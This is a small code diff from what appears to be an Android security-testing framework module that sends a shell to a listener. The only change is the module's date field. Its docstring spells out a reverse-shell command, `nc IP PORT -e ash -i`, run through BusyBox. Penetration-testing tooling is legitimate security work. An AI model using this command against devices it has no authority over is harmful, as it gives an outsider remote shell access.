@@ -8,7 +8,7 @@ class Send(Module, common.BusyBox, common.Shell):
 This module executes `nc IP PORT -e ash -i`, using BusyBox. This will send an ASH shell to a netcat listener."""
     examples = ""
     author = "Tyrone (@mwrlabs)"
-    date = "2012-11-06"
+    date = "2013-07-25"
     license = "BSD (3 clause)"
     path = ["shell"]
 
